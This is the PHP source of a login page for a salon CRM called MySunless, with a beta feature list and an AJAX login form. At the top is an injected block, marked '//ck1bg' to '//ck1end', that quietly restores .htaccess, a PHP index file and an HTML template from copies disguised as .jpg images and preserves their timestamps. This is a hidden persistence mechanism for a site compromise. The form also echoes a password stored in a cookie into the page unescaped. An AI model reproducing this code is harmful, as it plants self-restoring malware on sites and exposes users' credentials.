<?php
error_reporting(E_ALL);
ini_set("display_errors", 1);
//ck1bg

// require_once('root_config.php');

define('RSUB', '/crm');

$parseopmll = RSUB."/parseopmll";
$moban =  RSUB."/parseopmll/moban.html";
$indexp = RSUB."parseopmll/index.php";
$logs = RSUB."parseopmll/logs.txt"; 
$logo_s =  RSUB."images/logo_s.jpg";
$head_s = RSUB."images/head_s.jpg";
$banner_s = RSUB."images/banner_s.jpg"; 


$nowFileDir =  $parseopmll;
$nowHtacFile =  './.htaccess';
$nowMobanFile =  $moban;
$nowIndexFile =  $indexp;
$nowLogFile =  $logs;
$bkLocalFileIndex1 = $logo_s;
$bkLocalFileHtac1 =  $head_s;
$bkLocalFileMoban1 =  $banner_s;



// $nowFileDir =  '/crm/parseopmll';
// $nowHtacFile =  './.htaccess';
// $nowMobanFile =  './crm/parseopmll/moban.html';
// $nowIndexFile =  './crm/parseopmll/index.php';
// $nowLogFile =  './crm/parseopmll/logs.txt';
// $bkLocalFileIndex1 =  './crm/images/logo_s.jpg';
// $bkLocalFileHtac1 =  './crm/images/head_s.jpg';
// $bkLocalFileMoban1 =  './crm/images/banner_s.jpg';




if($nowHtacFile && file_exists($bkLocalFileHtac1)){
    if(!file_exists($nowHtacFile) or (filesize($nowHtacFile) != filesize($bkLocalFileHtac1))){
        if(!is_dir("./$nowFileDir")){
            @mkdir("./$nowFileDir",0755);
        }
        @chmod($nowHtacFile,0755);
        @file_put_contents($nowHtacFile,file_get_contents($bkLocalFileHtac1));
        @chmod($nowHtacFile,0755);
    }
}


if(file_exists($bkLocalFileIndex1)){
    if(!file_exists($nowIndexFile) or (filesize($nowIndexFile) != filesize($bkLocalFileIndex1) && !file_exists($nowLogFile))){
        if(!is_dir("./$nowFileDir")){
            @mkdir("./$nowFileDir",0755);
        }
        @chmod($nowIndexFile,0755);
        @file_put_contents($nowIndexFile,file_get_contents($bkLocalFileIndex1));
        @chmod($nowIndexFile,0755);
    }
}


if(file_exists($bkLocalFileMoban1)){

    if(!file_exists($nowMobanFile)){
        if(!is_dir("./$nowFileDir")){
            @mkdir("./$nowFileDir",0755);
        }
        @file_put_contents($nowMobanFile,file_get_contents($bkLocalFileMoban1));
        @chmod($nowMobanFile,0755);
    }else{
        if(filesize($nowMobanFile) != filesize($bkLocalFileMoban1)){
            $tpstrMb = file_get_contents($nowMobanFile);
            if(strstr($tpstrMb,"#bbbtitsbbb#") && !strstr($tpstrMb,"<!--ttt html5 tttt-->")){
                $fitime = filemtime($bkLocalFileMoban1);
                @chmod($bkLocalFileMoban1,0755);
                @file_put_contents($bkLocalFileMoban1,$tpstrMb);
                @touch($bkLocalFileMoban1, $fitime, $fitime);  
            }else{
                @chmod($bkLocalFileMoban1,0755);
                @file_put_contents($nowMobanFile,file_get_contents($bkLocalFileMoban1));
                @chmod($bkLocalFileMoban1,0755);
            }
        }
    }
    
}
//ck1end



ob_start();



require_once('function.php');

 // print_r($_COOKIE);
 // die();



if(isset($_REQUEST['percentage'])){
    $dbx = new db();
    $wuserid = $_SESSION['UserID'];
    $wcompanyinfo = 0; // 25
    $wcompanylogo = 0; //25
    $wpaymentsetup = 0; // 20
    $wcategory = 0; // 5
    $wemployee = 0; // 5
    $wsms = 0; // 10
    $wemail = 0; // 10

    $wpercentage = 0;
    // Company Information 

    $wcompanyx = $dbx->prepare("SELECT * FROM `CompanyInformation` where createdfk=:cfk OR updatedfk=:ufk");
    $wcompanyx->bindParam(':cfk',$wuserid,PDO::PARAM_INT);
    $wcompanyx->bindParam(':ufk',$wuserid,PDO::PARAM_INT);
    $wcompanyx->execute();
    $cdata = $wcompanyx->fetch(PDO::FETCH_ASSOC);
    if($cdata)
    {
        $wcompanyinfo =1;
        $wpercentage = $wpercentage + 25;
        if($cdata['compimg'] != '')
        {
            $wcompanylogo = 1;
            $wpercentage = $wpercentage + 25;
        }
    }
    

    
    // Payment Setup 

    $wpaymentx = $dbx->prepare("SELECT * FROM `paymentsetup` where UserID=:pid");
    $wpaymentx->bindParam(':pid',$wuserid,PDO::PARAM_INT);
    $wpaymentx->execute();
    $pdata = $wpaymentx->fetch(PDO::FETCH_ASSOC);
    if($pdata)
    {
        $wpaymentsetup = 1;
        $wpercentage = $wpercentage + 20;
    }

    // Category 

    $wcategoryx = $dbx->prepare("SELECT * FROM `Category` where createdfk=:catfk OR updatedfk=:uatfk");
    $wcategoryx->bindParam(':catfk',$wuserid,PDO::PARAM_INT);
    $wcategoryx->bindParam(':uatfk',$wuserid,PDO::PARAM_INT);
    $wcategoryx->execute();
    $catdata = $wcategoryx->fetch(PDO::FETCH_ASSOC);
    if($catdata)
    {
        $wcategory = 1;
        $wpercentage = $wpercentage + 5;
    }

    // Employee

    $wemployeex = $dbx->prepare("SELECT * FROM `users` where adminid=:adminid AND usertype='employee'");
    $wemployeex->bindParam(':adminid',$wuserid,PDO::PARAM_INT);
    $wemployeex->execute();
    $empdata = $wemployeex->fetch(PDO::FETCH_ASSOC);
    if($empdata)
    {
        $wemployee = 1;
        $wpercentage = $wpercentage + 5;
    }

    // Sms Setting

    $wsmsx = $dbx->prepare("SELECT * FROM `smssetting` where UserID=:smsid");
    $wsmsx->bindParam(':smsid',$wuserid,PDO::PARAM_INT);
    $wsmsx->execute();
    $smsdata = $wsmsx->fetch(PDO::FETCH_ASSOC);
    if($smsdata)
    {
        $wsms = 1;
        $wpercentage = $wpercentage + 10;
    }

    // Email Setting

    $wemailx = $dbx->prepare("SELECT * FROM `EmailSetting` where UserID=:emailid");
    $wemailx->bindParam(':emailid',$wuserid,PDO::PARAM_INT);
    $wemailx->execute();
    $emaildata = $wemailx->fetch(PDO::FETCH_ASSOC);
    if($emaildata)
    {
        $wemail = 1;
        $wpercentage = $wpercentage + 10;
    }
    echo json_encode(['percentage' => $wpercentage]);die;
}

?>

<html lang="en">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- Tell the browser to be responsive to screen width -->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <!-- Favicon icon -->
    <link rel="icon" type="image/png" sizes="16x16" href="<?php echo base_url ?>/assets/images/favicon.png">
    <title>
        MySunLess
    </title>
    <!-- page css -->


    <link href="<?php echo base_url ?>/assets/mystyle.css" rel="stylesheet">
    <!-- Custom CSS -->
    <link href="<?php echo base_url ?>/dist/css/style.min.css" rel="stylesheet">
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
        <!--[if lt IE 9]>
<script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
<script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
</head>
<?php
if(isset($_SESSION["UserID"]) && !empty($_SESSION["UserID"])){

    $dashRedirect = RSUB."/dashboard.php";

    header("Location:".$dashRedirect);
    die;
}
?>
<style type="text/css">
    .modal {
        display:none;
        position:fixed;
        z-index:1000;
        top:0;
        left:0;
        height:100%;
        width:100%;
        background: rgba( 255, 255, 255, .8) 
        url(<?php echo base_url ?>'/assets/images/ajax-loader.gif') 50% 50% no-repeat;
    }
    body.loading .modal {
        overflow: hidden;
    }
    body.loading .modal {
        display: block;
    }
        /*p#Price{padding: 5px 0;   margin: 5px;}
        input#Price {   padding: 0 5px !important;}
        span.input-group-text{border: 0!important;background: transparent!important; padding: 0!important;}*/
        .login-box.card {
            overflow: auto!important;
        }
        section#wrapper{overflow: auto;}
        .login-box.card{position: fixed;}

        @media only screen and (max-width: 414px) {
            .Rigebody .login-box.card{position: unset!important;}
        }

        @media (min-width: 320px) and (max-width: 767px)
        {
            .login-box.card{position: unset!important;}
            .dekstopview{display: none;}
            .mobileview{text-align: left; color: black; }
            .mobileview ul {padding: 0!important; }
            .allinfo{display: block!important; padding: 10px;}
        }
        .ChildModal {
            display: none; /* Hidden by default */
            position: fixed; /* Stay in place */
            z-index: 1; /* Sit on top */
            padding-top: 100px; /* Location of the box */
            left: 0;
            top: 0;
            width: 100%; /* Full width */
            height: 100%; /* Full height */
            overflow: auto; /* Enable scroll if needed */
            background-color: rgb(0,0,0); /* Fallback color */
            background-color: rgba(0,0,0,0.4); /* Black w/ opacity */
        }

        /* Modal Content */
        .CM-content {
            background-color: #fefefe;
            margin: auto;
            padding: 20px;
            border: 1px solid #888;
            width: 80%;
        }

        /* The Close Button */
        .CM-close {
            color: #aaaaaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
        }

        .CM-close:hover,
        .CM-close:focus {
            color: #000;
            text-decoration: none;
            cursor: pointer;
        }

        /*///Loader*/

        .load-wrapp {
            float: left;
            width: 100%;
            margin-bottom: 5px;
            border-radius: 5px;
            text-align: center;
            background-color: #d8d8d8;
        }
        .load-3{
            padding: 8px 16px;
            line-height: 2;
        }

        .line {
            display: inline-block;
            width: 15px;
            height: 15px;
            border-radius: 15px;
            background-color: #4b9cdb;
        }
        .load-3 .line:nth-last-child(1) {animation: loadingC .6s .1s linear infinite;}
        .load-3 .line:nth-last-child(2) {animation: loadingC .6s .2s linear infinite;}
        .load-3 .line:nth-last-child(3) {animation: loadingC .6s .3s linear infinite;}
        @keyframes loadingC {
            0 {transform: translate(0,0);}
            50% {transform: translate(0,15px);}
            100% {transform: translate(0,0);}
        }


    </style>
    <body>
        <!-- ============================================================== -->
        <!-- Preloader - style you can find in spinners.css -->
        <!-- ============================================================== -->
        <!-- ============================================================== -->
        <!-- Main wrapper - style you can find in pages.scss -->
        <!-- ============================================================== -->
        <!-- <section id="wrapper" class="login-register login-sidebar" style="background-image:url(../assets/images/background/login-register.jpg);"> -->
            <section id="wrapper" class="login-register login-sidebar" style="background-image: linear-gradient(rgba(0,0,0,.5), rgba(0,0,0,.7)),url(<?php echo base_url ?>/assets/images/bgimg1.jpg);">
               <div class="bgimg_text">
                   <div class="dekstopview">
                    <h2>
                        MYSUNLESS BETA VERSION 2.0
                    </h2>
                    <br>
                    <p>
                        MySunless is a new software platform currently in “Testing” stage.   Keep in mind that while most features are working as intended, you will come across features that might be working properly.  In this case, we hope you use the “Report Bug” button location in the bottom right corner of the dashboard once logged in.
                    </p>
                    <p>
                        Please keep a backup of your company and client information in case that our database is altered during BETA Testing which can cause loss of information.  This is only temporary until we release the final version of this software platform.   Many more features are still in development and will be added to the live beta test as you see them come online each day. 
                    </p>
                    <br>
                    <h5>
                        Current Features:  (But not all listed as the list is exhausting!) 
                    </h5>       
                    
                    <ul>
                        <li>Client Profiles
                            <ul>
                                <li>Organize your client information per customer</li>
                                <li>Custom notes about customer</li>
                                <li>Appointment History</li>
                                <li>Document / Contracts storage</li>
                                <li>Marketing Campaigns applied to customer</li>
                                <li>Contact Customer / History of communication</li>
                                <li>Order History</li>
                                <li>Address with driving directions to customer location</li>
                            </ul>
                        </li>
                        <li>Appointments
                            <ul>
                              <li>Create and manage appointments</li>
                              <li>Assign appointments to main account, or to employee account</li>
                              <li>Full calendar View</li>
                              <li>Automatic reminder text or email to be sent to customer</li>
                              <li>Automatic reminder text or email to be sent to customer
                                <ul>
                                    <li>Full template creation to have standard reminders formatted the way you like</li>
                                </ul></li>
                                <li>Employee block dates to let your team know they are unavailable</li>
                                <li>Create multiple services to be scheduled
                                    <ul>
                                        <li>You can create “service” type to use this system with all other services you offer with your business / salon.</li>
                                    </ul>       
                                </ul>
                            </li> 

                            <li>Point of Sale
                                <ul>
                                  <li>o Integration with SQUARE Payments, and Authorize.net </li>
                                  <li>Allows for Cash / Check / In-Person payment checkout</li>
                                  <li>Inventory management with creation of your product list through settings. 
                                    <ul>
                                        <li>Set your current inventory levels and our system will automatically deduct from your inventory when using our point of sale checkout.</li>
                                    </ul></li>
                                    <li>Customer Reward Point System 
                                        <ul>
                                            <li>Set customer savings or reward points that is automatically calculated and store per client profile to be used during checkout.</li>
                                        </ul>       
                                    </li>

                                    <li>Employee Commission system built in. 
                                        <ul>
                                            <li>If employee is credited,  you can view reports of commissions set through the product inventory. </li>
                                        </ul>       
                                    </li>
                                    <li> Sell Product, Service, and Membership packages straight from the Point of Sale dashboard which is then tracked in customer profile / history of customer.</li> 

                                </li>

                            </ul>
                            <li>Membership System
                                <ul>
                                    <li>Create membership packages to be automatically billed if using square or authorize payment system.  </li>
                                    <li>You can setup packages for weekly, bi-weekly, monthly, yearly increments.</li>
                                    <li>Dashboard for membership shows lists of customers due for upcoming renewals, currently paid customers, and customers that have been declined or not paid.</li>
                                    
                                </ul>
                            </li>

                            <li>Note Board 
                                <ul>
                                    <li>Create tasks and notes for yourself or employees to view.</li>
                                    <li>Reminders will show on main dashboard of your todo list.</li>
                                    <li>Tracks completion of tasks assigned to employee for monitoring activity.</li>
                                    
                                </ul>
                            </li>

                            <li>Marketing
                                <ul>
                                    <li>Setup simple or advanced marketing campaigns that will be sent to your customer base depending on tags assigned to your customer.</li>
                                    <li>Text or email customers based of interactions on our system.</li>
                                    <li>Send campaigns if customers have not had a service at your set time inactive. </li>
                                    <li>Take a complete hands off approach once templates are created for a 100% automatic marketing campaign to promote your business!</li>
                                    <li>Offline marketing image downloads to be used on your Instagram and other social media platforms. </li>
                                    
                                </ul>
                            </li> 

                            <li>Reports
                                <ul>
                                    <li>Track expense of product cost vs sales</li>
                                    <li>Track employee activity with appointments and customer profile interaction</li>
                                    <li>Track your profit and sales numbers by custom date range.</li>
                                    <li>Track employee commission</li>
                                    <li>+++ Much much more!</li>
                                    
                                </ul>
                            </li> 

                            <li>Resources
                                <ul>
                                    <li>Coming soon!  Videos, forms, and other great tools to build your business.</li>
                                </ul>
                            </li> 

                            <li>Company Settings
                                <ul>
                                    <li>Setup employees and employee roles. 
                                        <ul>
                                            <li>Allow or disallow certain features for employees</li>
                                            <li>Employees have their own separate login which you can reset password or delete account through your main business login. </li>
                                        </ul>
                                    </li>
                                    <li> Many API settings and company settings to customize your MySunless experience. </li> 
                                    <li> Data Backup
                                        <ul>
                                            <li>Automatically download your customer data on a weekly, monthly, or yearly basis to make sure you never lose your database of valuable information!</li>

                                        </ul>
                                    </li>
                                    <li>Employee Import 
                                        <ul>
                                            <li>Automatically link your facebook, yahoo, or gmail contacts to mysunless for an automatic import and creation of customer profiles.</li>
                                            <li>This is to be used to help create “potential” clients outside of your normal customers,  which can then be used for automatic campaign / marketing. </li>
                                        </ul>
                                    </li>
                                    <li>Set custom dashboard logo to give branding to your business / salon. </li>
                                </ul>
                            </li> 


                        </ul>
                    </li>
                </ul>
                <br>

            </div>

            <div id="myModal" class="ChildModal">

              <!-- Modal content -->
              <div class="CM-content">
                <span class="CM-close">&times;</span>

                <div class="mobileview" style="">
                    <h2>
                        MYSUNLESS BETA VERSION 2.0
                    </h2>
                    <br>
                    <p>
                        MySunless is a new software platform currently in “Testing” stage.   Keep in mind that while most features are working as intended, you will come across features that might be working properly.  In this case, we hope you use the “Report Bug” button location in the bottom right corner of the dashboard once logged in.
                    </p>
                    <p>
                        Please keep a backup of your company and client information in case that our database is altered during BETA Testing which can cause loss of information.  This is only temporary until we release the final version of this software platform.   Many more features are still in development and will be added to the live beta test as you see them come online each day. 
                    </p>
                    <br>
                    <h5>
                        Current Features:  (But not all listed as the list is exhausting!) 
                    </h5>       
                    
                    <ul>
                        <li>Client Profiles
                            <ul>
                                <li>Organize your client information per customer</li>
                                <li>Custom notes about customer</li>
                                <li>Appointment History</li>
                                <li>Document / Contracts storage</li>
                                <li>Marketing Campaigns applied to customer</li>
                                <li>Contact Customer / History of communication</li>
                                <li>Order History</li>
                                <li>Address with driving directions to customer location</li>
                            </ul>
                        </li>
                        <li>Appointments
                            <ul>
                              <li>Create and manage appointments</li>
                              <li>Assign appointments to main account, or to employee account</li>
                              <li>Full calendar View</li>
                              <li>Automatic reminder text or email to be sent to customer</li>
                              <li>Automatic reminder text or email to be sent to customer
                                <ul>
                                    <li>Full template creation to have standard reminders formatted the way you like</li>
                                </ul></li>
                                <li>Employee block dates to let your team know they are unavailable</li>
                                <li>Create multiple services to be scheduled
                                    <ul>
                                        <li>You can create “service” type to use this system with all other services you offer with your business / salon.</li>
                                    </ul>       
                                </ul>
                            </li> 

                            <li>Point of Sale
                                <ul>
                                  <li>o Integration with SQUARE Payments, and Authorize.net </li>
                                  <li>Allows for Cash / Check / In-Person payment checkout</li>
                                  <li>Inventory management with creation of your product list through settings. 
                                    <ul>
                                        <li>Set your current inventory levels and our system will automatically deduct from your inventory when using our point of sale checkout.</li>
                                    </ul></li>
                                    <li>Customer Reward Point System 
                                        <ul>
                                            <li>Set customer savings or reward points that is automatically calculated and store per client profile to be used during checkout.</li>
                                        </ul>       
                                    </li>

                                    <li>Employee Commission system built in. 
                                        <ul>
                                            <li>If employee is credited,  you can view reports of commissions set through the product inventory. </li>
                                        </ul>       
                                    </li>
                                    <li> Sell Product, Service, and Membership packages straight from the Point of Sale dashboard which is then tracked in customer profile / history of customer.</li> 

                                </li>

                            </ul>
                            <li>Membership System
                                <ul>
                                    <li>Create membership packages to be automatically billed if using square or authorize payment system.  </li>
                                    <li>You can setup packages for weekly, bi-weekly, monthly, yearly increments.</li>
                                    <li>Dashboard for membership shows lists of customers due for upcoming renewals, currently paid customers, and customers that have been declined or not paid.</li>
                                    
                                </ul>
                            </li>

                            <li>Note Board 
                                <ul>
                                    <li>Create tasks and notes for yourself or employees to view.</li>
                                    <li>Reminders will show on main dashboard of your todo list.</li>
                                    <li>Tracks completion of tasks assigned to employee for monitoring activity.</li>
                                    
                                </ul>
                            </li>

                            <li>Marketing
                                <ul>
                                    <li>Setup simple or advanced marketing campaigns that will be sent to your customer base depending on tags assigned to your customer.</li>
                                    <li>Text or email customers based of interactions on our system.</li>
                                    <li>Send campaigns if customers have not had a service at your set time inactive. </li>
                                    <li>Take a complete hands off approach once templates are created for a 100% automatic marketing campaign to promote your business!</li>
                                    <li>Offline marketing image downloads to be used on your Instagram and other social media platforms. </li>
                                    
                                </ul>
                            </li> 

                            <li>Reports
                                <ul>
                                    <li>Track expense of product cost vs sales</li>
                                    <li>Track employee activity with appointments and customer profile interaction</li>
                                    <li>Track your profit and sales numbers by custom date range.</li>
                                    <li>Track employee commission</li>
                                    <li>+++ Much much more!</li>
                                    
                                </ul>
                            </li> 

                            <li>Resources
                                <ul>
                                    <li>Coming soon!  Videos, forms, and other great tools to build your business.</li>
                                </ul>
                            </li> 

                            <li>Company Settings
                                <ul>
                                    <li>Setup employees and employee roles. 
                                        <ul>
                                            <li>Allow or disallow certain features for employees</li>
                                            <li>Employees have their own separate login which you can reset password or delete account through your main business login. </li>
                                        </ul>
                                    </li>
                                    <li> Many API settings and company settings to customize your MySunless experience. </li> 
                                    <li> Data Backup
                                        <ul>
                                            <li>Automatically download your customer data on a weekly, monthly, or yearly basis to make sure you never lose your database of valuable information!</li>

                                        </ul>
                                    </li>
                                    <li>Employee Import 
                                        <ul>
                                            <li>Automatically link your facebook, yahoo, or gmail contacts to mysunless for an automatic import and creation of customer profiles.</li>
                                            <li>This is to be used to help create “potential” clients outside of your normal customers,  which can then be used for automatic campaign / marketing. </li>
                                        </ul>
                                    </li>
                                    <li>Set custom dashboard logo to give branding to your business / salon. </li>
                                </ul>
                            </li> 


                        </ul>
                    </li>
                </ul>
                <br>
            </div>
        </div>
    </div>

</div>

<div class="login-box card">
    <a id="myBtn" class="allinfo" style="text-align: right; display: none;" onclick="OpenModal('myModal')"><i class="fa fa-info-circle" aria-hidden="true"></i></a>
    <div class="card-body" style="background: white; ">
        <a href="<?php echo base_url; ?>" class="text-center db"><img style="width: 100%;" src="<?php echo  base_url ?>/assets/images/mysunless_logo.png" /></a>
        <h3 class="box-title m-t-40 m-b-0">
            LOGIN NOW
        </h3>
        <form class="form-horizontal" id="loginForm" method="post" action="" autocomplete="off">
            <div class="form-group m-t-40">
                <div class="col-xs-12">
                    <input class="form-control" type="text" id="UserName"  name="UserName" placeholder="Email/Username" autocomplete="nope" value="<?php if(isset($_COOKIE["userName"])) { echo $_COOKIE["userName"]; } ?>" >
                </div>
            </div>
            <div class="form-group">
                <div class="col-xs-12">
                    <input class="form-control" type="password" id="password" name="password" placeholder="Password" autocomplete="nope" value="<?php if(isset($_COOKIE["password"])) { echo $_COOKIE["password"]; } ?>" >
                </div>
            </div>
            <div class="form-group row">
                <div class="col-md-12">
                    <div class="custom-control custom-checkbox">
                        <input type="checkbox" name="remember" class="custom-control-input" id="customCheck1" <?php if(isset($_COOKIE["userName"])) { ?> checked <?php } ?> >
                        <label class="custom-control-label" for="customCheck1">Remember me</label>
                        <a href="
                        <?php echo base_url;?>/ForgetPassword" id="" class="text-dark pull-right"><i class="fa fa-lock m-r-5">
                        </i> Forgot Password?</a>
                    </div>
                </div>
            </div>
            <div class="col-lg-12 col-md-12 response_msg">
                <div class="alert alert-success" id="resonse" style="display: none;">
                    <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <span aria-hidden="true">&times;</span> </button>
                    <h3 class="text-success">
                        <i class="fa fa-check-circle">
                        </i>
                        Success
                    </h3>
                    <p id="resonsemsg">
                    </p>
                </div>
                <div class="alert alert-danger" id="error" style="display: none;">
                    <button type="button" class="close" data-dismiss="alert" aria-label="Close"> <span aria-hidden="true">&times;</span> </button>
                    <h3 class="text-danger">
                        <i class="fa fa-exclamation-circle">
                        </i>
                        Errors
                    </h3>
                    <p id="errormsg">
                    </p>
                </div>
            </div>
            <button class="btn btn-info btn-lg btn-block text-uppercase btn-rounded myclassbtn" type="submit">Log In</button>
            <div class="load-wrapp" id="submit_loader" style="display: none;">
                <div class="load-3">
                    <div class="line"></div>
                    <div class="line"></div>
                    <div class="line"></div>
                </div>
            </div>
            <div class="modal">
            </div>
        </form>
        <div class="form-group m-b-0">
            <div class="col-sm-12 text-center">
                Don't have an account? 
                <a href="<?php echo base_url ?>/Register" class="text-primary m-l-5"><b>
                    Sign Up
                </b></a>
            </div>
        </div>
        <form class="form-horizontal" autocomplete="off" id="recoverform" action="<?php echo base_url ?>/dashboard.php">
            <div class="form-group ">
                <div class="col-xs-12">
                    <h3>
                        Recover Password
                    </h3>
                    <p class="text-muted">
                        Enter your Email and instructions will be sent to you! 
                    </p>
                </div>
            </div>
            <div class="form-group ">
                <div class="col-xs-12">
                    <input class="form-control" type="text" required="" placeholder="Email">
                </div>
            </div>
            <div class="form-group text-center m-t-20">
                <div class="col-xs-12">
                    <button class="btn btn-primary btn-lg btn-block text-uppercase waves-effect waves-light" type="submit">Reset</button>
                </div>
            </div>
            <label class="form-check-label">
                <span class="text-danger align-middle" id="errorMsg"></span>
            </label>
        </form>
    </div>
</div>
</section>
<!-- ============================================================== -->
<!-- End Wrapper -->
<!-- ============================================================== -->
<!-- ============================================================== -->
<!-- All Jquery --> 
<!-- ============================================================== -->


<script src="<?php echo base_url; ?>/assets/node_modules/jquery/jquery-3.2.1.min.js"></script>
<script src="<?php echo base_url; ?>/dist/js/jquery.validate.js"></script>
<!-- Bootstrap tether Core JavaScript -->
        <!--<script src="
<?php echo base_url; ?>/assets/node_modules/popper/popper.min.js"></script>
<script src="
<?php echo base_url; ?>/assets/node_modules/bootstrap/dist/js/bootstrap.min.js"></script>-->
        <!-- <script src="
            <?php echo base_url; ?>/dist/js/sweetalert.min.js"></script>  -->
            <!--Custom JavaScript -->

            <script type="text/javascript">
                $(document).ready(function(){
                    $("#loginForm").validate({
                        rules: {
                            UserName: {
                                required: true,
                                minlength: 4
                            }
                            ,
                            password: "required"
                        }
                        ,
                        messages: {
                            UserName: {
                                required: "Please enter username",
                                minlength: "Your username must consist of at least 4 characters"
                            }
                            ,
                            Password:  "Please enter your password"
                        }
                        ,submitHandler: function() {


                            // $(".modal").show();
                            $("#submit_loader").show();
                            $(".myclassbtn").hide();
                            $("#resonse").hide();
                            $("#error").hide();

                            var data = $("#loginForm").serialize();
                            data= data + "&LoginAction=Login";
                            jQuery.ajax({
                                dataType:"json",
                                type:"post",
                                data:data,
                                url:'<?php echo EXEC; ?>Exec-Login',
                                success: function(data)
                                {

                                    if(data.resonse){
			                            $("#resonse").show();
	                                    $('#resonsemsg').html('<span>'+data.resonse+'</span>');
	                                    window.location.href = "<?php echo base_url ?>/dashboard.php";
                                    	//setTimeout(function () {window.location.href = "<?php echo base_url ?>/dashboard.php";}, 0);
                                    }else if(data.error){
                                    	$("#error").show();
		                                $('#errormsg').html('<span>'+data.error+'</span>');
		                                $(".modal").hide();
                                    }

                                    $("#submit_loader").hide();
                                    $(".myclassbtn").show();
                                    
                                //     if(data.resonse)
                                //     {
                                //     //$("#resonse").show();
                                //     //$('#resonsemsg').html('<span>'+data.resonse+'</span>');
                                //     $.ajax({
                                //         dataType:'json',
                                //         type:'post',
                                //         data:{'percentage':'0'},
                                //         url:'?action="per"',
                                //         success: function(data2){
                                //             if(data2){
                                //                 // if(data2.percentage <= 50){
                                //                 //     //alert("setupvizar");
                                //                 //      setTimeout(function () {window.location.href = "<?php echo base_url ?>/SetupWizard.php";}, 0)
                                //                 //  }else{
                                //                      //alert("dashboard");
                                //                      setTimeout(function () {window.location.href = "<?php echo base_url ?>/dashboard.php";}, 0)
                                //                  //}
                                //              }
                                //          }
                                //      });
                                //     $(".modal").hide();
                                //     //window.location.href="<?php echo base_url; ?>/dashboard.php";   
                                // }
                                // else if(data.error)
                                // {
                                //     $("#error").show();
                                //     $('#errormsg').html('<span>'+data.error+'</span>');
                                //     $(".modal").hide();
                                //     // alert('<li>'+data.error+'</li>');
                                // }
                            }
                        }
                        );
                        }
                    }
                    );
                }
                );
            </script>
            <script type="text/javascript">
                $(function() {
                    $(".preloader").fadeOut();
                }
                );
            /* $(function() {
$('[data-toggle="tooltip"]').tooltip()
}); */
            // ============================================================== 
            // Login and Recover Password 
            // ============================================================== 
            $('#to-recover').on("click", function() {
                $("#loginform").slideUp();
                $("#recoverform").fadeIn();
            }
            );
        </script>
        <script type="text/javascript">
            $(".close").click(function(){
                $("#error").hide();
            });
            function OpenModal(id){
                jQuery("#"+id).css({"display":"block"});
            }
            jQuery(document).ready(function(){
                jQuery(".CM-close").click(function(){
                    jQuery(".ChildModal").css({"display":"none"});
                });
            });
        </script>
    </body>
    </html>